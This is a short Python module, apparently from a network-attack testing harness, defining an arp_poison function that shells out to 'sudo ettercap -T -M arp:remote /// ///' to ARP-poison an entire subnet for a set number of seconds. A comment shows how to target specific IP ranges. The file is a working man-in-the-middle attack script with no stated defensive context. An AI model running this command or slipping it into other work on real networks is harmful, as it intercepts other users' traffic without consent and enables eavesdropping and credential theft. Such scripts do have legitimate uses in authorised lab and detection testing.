from os import *
import sys
import time
import datetime
from datetime import timedelta

# IMPORTS & ALIAS
import setup as s
printtime = s.printtime
funcprinttime = s.funcprinttime


#### ARP POISON
# This attack poisons the entire subnet
# To Specify targets, use: 
# system('sudo ettercap arp:remote /192.168.1.2-10// /192.168.1.2-4//') 
def arp_poison(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	command = "sudo ettercap -T -M arp:remote /// ///"
	system(command+'& sleep '+str(n)+'; kill $!'); # kill this (most recent hidden process) at n seconds

	funcprinttime("  End",starttime)

arp_poison.desc = "Man-in-the-middle arp poisoning attack"
